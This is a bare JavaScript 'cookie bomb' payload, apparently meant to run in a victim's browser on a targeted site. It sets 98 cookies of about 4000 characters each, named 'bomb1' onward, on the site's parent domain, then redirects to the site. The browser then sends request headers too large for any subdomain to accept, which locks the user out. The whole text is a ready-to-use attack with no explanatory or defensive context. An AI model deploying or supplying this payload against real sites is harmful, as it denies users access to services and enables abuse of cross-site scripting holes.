var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution   = Array(4000).join('a');

for (var i = 1; i < 99; i++) {
    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
}

window.location="https://" + document.domain;